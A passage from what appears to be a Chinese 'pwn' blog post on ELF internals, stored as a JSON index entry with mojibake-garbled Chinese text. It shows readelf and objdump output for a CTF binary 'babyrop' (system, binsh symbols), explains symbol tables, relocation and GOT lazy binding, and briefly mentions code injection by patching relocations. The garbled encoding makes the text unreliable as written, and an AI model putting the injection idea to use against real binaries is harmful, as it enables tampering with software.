entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FUNC GLOBAL DEFAULT UND [...]@GLIBC_2.2.5 (2) 2: 0000000000000000 0 FUNC GLOBAL DEFAULT UND [...]@GLIBC_2.2.5 (2) 3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND [...]@GLIBC_2.2.5 (2) 4: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 5: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __[...]@GLIBC_2.7 (3) Symbol table \u0026#39;.symtab\u0026#39; contains 70 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000400238 0 SECTION LOCAL DEFAULT 1 .interp 2: 0000000000400254 0 SECTION LOCAL DEFAULT 2 .note.ABI-tag 3: 0000000000400274 0 SECTION LOCAL DEFAULT 3 .note.gnu.build-id 4: 0000000000400298 0 SECTION LOCAL DEFAULT 4 .gnu.hash 5: 00000000004002b8 0 SECTION LOCAL DEFAULT 5 .dynsym 6: 0000000000400348 0 SECTION LOCAL DEFAULT 6 .dynstr 7: 00000000004003a8 0 SECTION LOCAL DEFAULT 7 .gnu.version 8: 00000000004003b8 0 SECTION LOCAL DEFAULT 8 .gnu.version_r 9: 00000000004003e8 0 SECTION LOCAL DEFAULT 9 .rela.dyn 10: 0000000000400400 0 SECTION LOCAL DEFAULT 10 .rela.plt 11: 0000000000400460 0 SECTION LOCAL DEFAULT 11 .init 12: 0000000000400480 0 SECTION LOCAL DEFAULT 12 .plt 13: 00000000004004d0 0 SECTION LOCAL DEFAULT 13 .plt.got 14: 00000000004004e0 0 SECTION LOCAL DEFAULT 14 .text 15: 0000000000400694 0 SECTION LOCAL DEFAULT 15 .fini 16: 00000000004006a0 0 SECTION LOCAL DEFAULT 16 .rodata 17: 00000000004006e8 0 SECTION LOCAL DEFAULT 17 .eh_frame_hdr 18: 0000000000400720 0 SECTION LOCAL DEFAULT 18 .eh_frame 19: 0000000000600e10 0 SECTION LOCAL DEFAULT 19 .init_array 20: 0000000000600e18 0 SECTION LOCAL DEFAULT 20 .fini_array 21: 0000000000600e20 0 SECTION LOCAL DEFAULT 21 .jcr 22: 0000000000600e28 0 SECTION LOCAL DEFAULT 22 .dynamic 23: 0000000000600ff8 0 SECTION LOCAL DEFAULT 23 .got 24: 0000000000601000 0 SECTION LOCAL DEFAULT 24 .got.plt 25: 0000000000601038 0 SECTION LOCAL DEFAULT 25 .data 26: 0000000000601050 0 SECTION LOCAL DEFAULT 26 .bss 27: 0000000000000000 0 SECTION LOCAL DEFAULT 27 .comment 28: 0000000000000000 0 FILE LOCAL DEFAULT ABS crtstuff.c 29: 0000000000600e20 0 OBJECT LOCAL DEFAULT 21 __JCR_LIST__ 30: 0000000000400510 0 FUNC LOCAL DEFAULT 14 deregister_tm_clones 31: 0000000000400550 0 FUNC LOCAL DEFAULT 14 register_tm_clones 32: 0000000000400590 0 FUNC LOCAL DEFAULT 14 __do_global_dtors_aux 33: 0000000000601050 1 OBJECT LOCAL DEFAULT 26 completed.7594 34: 0000000000600e18 0 OBJECT LOCAL DEFAULT 20 __do_global_dtor[...] 35: 00000000004005b0 0 FUNC LOCAL DEFAULT 14 frame_dummy 36: 0000000000600e10 0 OBJECT LOCAL DEFAULT 19 __frame_dummy_in[...] 37: 0000000000000000 0 FILE LOCAL DEFAULT ABS babyrop.c 38: 0000000000000000 0 FILE LOCAL DEFAULT ABS crtstuff.c 39: 0000000000400810 0 OBJECT LOCAL DEFAULT 18 __FRAME_END__ 40: 0000000000600e20 0 OBJECT LOCAL DEFAULT 21 __JCR_END__ 41: 0000000000000000 0 FILE LOCAL DEFAULT ABS 42: 0000000000600e18 0 NOTYPE LOCAL DEFAULT 19 __init_array_end 43: 0000000000600e28 0 OBJECT LOCAL DEFAULT 22 _DYNAMIC 44: 0000000000600e10 0 NOTYPE LOCAL DEFAULT 19 __init_array_start 45: 00000000004006e8 0 NOTYPE LOCAL DEFAULT 17 __GNU_EH_FRAME_HDR 46: 0000000000601000 0 OBJECT LOCAL DEFAULT 24 _GLOBAL_OFFSET_TABLE_ 47: 0000000000400690 2 FUNC GLOBAL DEFAULT 14 __libc_csu_fini 48: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterT[...] 49: 0000000000601038 0 NOTYPE WEAK DEFAULT 25 data_start 50: 0000000000601050 0 NOTYPE GLOBAL DEFAULT 25 _edata 51: 0000000000400694 0 FUNC GLOBAL DEFAULT 15 _fini 52: 0000000000000000 0 FUNC GLOBAL DEFAULT UND system@@GLIBC_2.2.5 53: 0000000000000000 0 FUNC GLOBAL DEFAULT UND printf@@GLIBC_2.2.5 54: 0000000000601048 8 OBJECT GLOBAL DEFAULT 25 binsh 55: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_mai[...] 56: 0000000000601038 0 NOTYPE GLOBAL DEFAULT 25 __data_start 57: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 58: 0000000000601040 0 OBJECT GLOBAL HIDDEN 25 __dso_handle 59: 00000000004006a0 4 OBJECT GLOBAL DEFAULT 16 _IO_stdin_used 60: 0000000000400620 101 FUNC GLOBAL DEFAULT 14 __libc_csu_init 61: 0000000000601058 0 NOTYPE GLOBAL DEFAULT 26 _end 62: 00000000004004e0 42 FUNC GLOBAL DEFAULT 14 _start 63: 0000000000601050 0 NOTYPE GLOBAL DEFAULT 26 __bss_start 64: 00000000004005d6 69 FUNC GLOBAL DEFAULT 14 main 65: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _Jv_RegisterClasses 66: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __isoc99_scanf@@[...] 67: 0000000000601050 0 OBJECT GLOBAL HIDDEN 25 __TMC_END__ 68: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMC[...] 69: 0000000000400460 0 FUNC GLOBAL DEFAULT 11 _init æˆ‘ä»¬å¯ä»¥çœ‹åˆ°.symtabèŠ‚ä¸­ä¿å­˜äº†èŠ‚ã€æ•°æ®å¯¹è±¡ã€åŒ…æ‹¬mainåœ¨å†…çš„å‡½æ•°ç­‰ï¼Œè¿™äº›å¯¹æˆ‘ä»¬çš„è°ƒè¯•ã€åæ±‡ç¼–éƒ½æ˜¯éå¸¸é‡è¦çš„ã€‚\nå½“æˆ‘ä»¬ä½¿ç”¨objdumpæ—¶ï¼Œæ¯ä¸€æ®µä»£ç å‰é¢ä¼šæœ‰ä¸€ä¸ªæ ‡æ³¨ï¼Œå¦‚ä¸‹ï¼š\n$ objdump -d babyrop babyropï¼š æ–‡ä»¶æ ¼å¼ elf64-x86-64 Disassembly of section .init: 0000000000400460 \u0026lt;_init\u0026gt;: 400460: 48 83 ec 08 sub $0x8,%rsp 400464: 48 8b 05 8d 0b 20 00 mov 0x200b8d(%rip),%rax # 600ff8 \u0026lt;__gmon_start__\u0026gt; 40046b: 48 85 c0 test %rax,%rax 40046e: 74 05 je 400475 \u0026lt;_init+0x15\u0026gt; 400470: e8 5b 00 00 00 call 4004d0 \u0026lt;__gmon_start__@plt\u0026gt; 400475: 48 83 c4 08 add $0x8,%rsp 400479: c3 ret ... è¿‡ç¨‹å…¥å£æ˜¯æ¯ä¸ªå‡½æ•°çš„èµ·ç‚¹ï¼Œå› æ­¤é€šè¿‡æ£€æµ‹è¿‡ç¨‹åºè¨€ï¼ˆprocedure prologueï¼‰å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªæ–°éŸ©æ·‘çš„èµ·å§‹ä½ç½®\nå¦‚æœæ®µæ˜¯å…¬å¸ä¸­ä¸åŒçš„éƒ¨é—¨ï¼ŒèŠ‚å°±æ˜¯éƒ¨é—¨ä¸­çš„å„å°ç»„ï¼Œè€Œç¬¦å·è¡¨å°±æ˜¯ä¸€å¼ ç™»è®°è¡¨ï¼ŒæŠŠå„å°ç»„åŠå…¶æˆå‘˜éƒ½ç™»è®°åœ¨è¡¨ä¸Šï¼Œå¦‚æœæ²¡æœ‰ç¬¦å·è¡¨ï¼Œè€æ¿å°±ä¸çŸ¥é“è°æ˜¯è°äº†\n.symtabèŠ‚ ä¿å­˜äº†ç¬¦å·ä¿¡æ¯ï¼Œç”¨äºè°ƒè¯•å’Œé“¾æ¥ï¼Œä¿å­˜äº†å¯æ‰§è¡Œæ–‡ä»¶çš„æœ¬åœ°ç¬¦å·ï¼ˆå…¨å±€å˜é‡ã€æœ¬åœ°å‡½æ•°ç­‰ï¼‰\n.symtabä¸­ä¿å­˜äº†æ‰€æœ‰çš„ç¬¦å·ï¼Œæœ‰å¾ˆå¤šéƒ½æ˜¯å¾ˆé‡è¦çš„ï¼Œå¦‚æœæŠŠä»–ä»¬å»æ‰ï¼Œè™½ç„¶ä¸¥æ ¼æ„ä¹‰ä¸Šä¸ä¼šå¦¨ç¢ç¨‹åºçš„è¿è¡Œï¼Œä½†æ˜¯å¯¹äººæ¥è¯´å°±éš¾è¯»äº†å¾ˆå¤š\n.strtabèŠ‚ ä¿å­˜äº†ç¬¦å·å­—ç¬¦ä¸²è¡¨ï¼Œè¯¥å†…å®¹ä¼šè¢«.symtabç»“æ„å¼•ç”¨\n.dynsymèŠ‚ dynsymï¼Œdynamic symbolsï¼Œä¿å­˜äº†ä»å…±äº«åº“å¯¼å…¥çš„åŠ¨æ€ç¬¦å·ä¿¡æ¯ï¼Œä¿å­˜åœ¨textæ®µä¸­\nå®ƒæ˜¯ .symtabçš„å­é›†ï¼Œå®ƒåªä¿å­˜åŠ¨æ€/å…¨å±€ç¬¦å·\nä¸symtabä¸åŒçš„æ˜¯ï¼ŒåŠ¨æ€é“¾æ¥çš„äºŒè¿›åˆ¶æ–‡ä»¶è¿è¡Œæ—¶ä¸èƒ½ç¼ºå°‘å®ƒï¼›symtabå¯ä»¥åˆ æ‰ä½†å®ƒä¸èƒ½ã€‚ä½†æ˜¯å¦‚æœæ˜¯é™æ€é“¾æ¥ç¨‹åºï¼Œç”¨stripå‘½ä»¤æ¸…ç†åå°±ä¸ä¼šæœ‰ç¬¦å·è¡¨ï¼ˆdynsymä¹Ÿå˜æˆéå¿…éœ€çš„äº†ï¼‰\n.dynstrèŠ‚ ä¿å­˜äº†åŠ¨æ€ç¬¦å·å­—ç¬¦ä¸²è¡¨ï¼Œå°±æ˜¯åŠ¨æ€ç¬¦å·çš„åå­—\n.rel.*èŠ‚ rel-\u0026gt;reacationï¼Œé‡å®šä½èŠ‚ï¼Œä¿å­˜äº†é‡å®šä½ç›¸å…³çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯æè¿°äº†å¦‚ä½•åœ¨é“¾æ¥æˆ–è¿è¡Œè¿‡ç¨‹ä¸­å¯¹éƒ¨åˆ†å†…å®¹æˆ–è¿›ç¨‹é•œåƒè¿›è¡Œè¡¥å……æˆ–ä¿®æ”¹\n.hashèŠ‚ ä¿å­˜äº†ä¸€ä¸ªç”¨äºæŸ¥æ‰¾ç¬¦å·çš„å“ˆå¸Œè¡¨ï¼ˆæ•£åˆ—è¡¨ï¼‰\n.shstrtabèŠ‚ ä¿å­˜äº†èŠ‚å¤´å­—ç¬¦ä¸²è¡¨ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ªèŠ‚å¤´çš„åå­—\nELFé‡å®šä½ Relocation é‡å®šä½å°±æ˜¯å°†ç¬¦å·å®šä¹‰å’Œç¬¦å·å¼•ç”¨è¿›è¡Œè¿æ¥çš„è¿‡ç¨‹ã€‚\nåœ¨é‡å®šä½æ–‡ä»¶ä¸­ï¼Œé‡å®šä½è®°å½•ä¿å­˜äº†å¦‚ä½•å¯¹ç»™å®šçš„ç¬¦å·å¯¹åº”ä»£ç è¿›è¡Œè¡¥å……çš„ç›¸å…³ä¿¡æ¯ï¼Œå®é™…ä¸Šæ˜¯ä¸€ç§ç»™äºŒè¿›åˆ¶æ–‡ä»¶æ‰“è¡¥ä¸çš„æœºåˆ¶ã€‚\nä¾‹å¦‚ï¼Œ1.oçš„ä»£ç ä¸­å¼•ç”¨äº†2.oä¸­çš„ä»£ç ï¼Œå½“é“¾æ¥çš„æ—¶å€™å°±ä¼šå¯¹1.oä¸­çš„é‡å®šä½è®°å½•è¿›è¡Œåˆ†æï¼Œç›®æ ‡æ–‡ä»¶ä¸­çš„ä»£ç ä¼šè¢«é‡å®šä½åˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„æ®µä¸­ä¸€ä¸ªç»™å®šçš„åœ°å€ï¼Œç¬¦å·å¼•ç”¨è¢«è§£ææˆäº†ç¬¦å·å®šä¹‰ã€‚\nå¯¹äºå…±äº«åº“çš„å‡½æ•°ï¼Œç”±äºå»¶è¿Ÿé“¾æ¥ï¼Œåªæœ‰å½“ä¸€ä¸ªå‡½æ•°çœŸæ­£è¢«è°ƒç”¨æ—¶ï¼Œæ‰ä¼šè¿›è¡ŒGOTé‡å®šä½\nåŸºäºäºŒè¿›åˆ¶ä¿®è¡¥çš„é‡å®šä½ä»£ç æ³¨å…¥ æ—¢ç„¶é‡å®šä½æ˜¯å°†ç¬¦å·å¼•ç”¨å®ç°çš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ›´æ”¹å¯æ‰§è¡Œæ–‡ä»¶çš„ç¬¦å·è¡¨ï¼Œè®©å…¶æŒ‡å‘æˆ‘ä»¬ç»™å®šçš„ç›®æ ‡æ–‡ä»¶è®©å…¶é‡å®šä½ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç å°±å˜æˆäº†å¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€éƒ¨åˆ†\næ›´å¤šçš„èµ„æ–™æ•¬è¯·é˜…è¯»Linux ELF æ‰‹å†Œ\n","date":"2022å¹´10æœˆ26æ—¥","permalink":"https://peterliuzhi.top/principle/elf%E8%AF%A6%E8%A7%A3/","section":"principle","summary":"Myths which are believed in tend to become true. â€” George Orwell ELFè¯¦è§£ ä»€ä¹ˆæ˜¯ELF ä½¿ç”¨readelfå‘½ä»¤è¯»å–elfæ–‡ä»¶ ELFæ–‡ä»¶ç±»å‹ ELFç¨‹åºå¤´ï¼ˆæè¿°æ®µçš„å¤´ï¼‰ PT_LOAD PT_DYNAMICï¼ˆåŠ¨æ€","tags":["pwn","ELF"],"title":"ELFè¯¦è§£"}]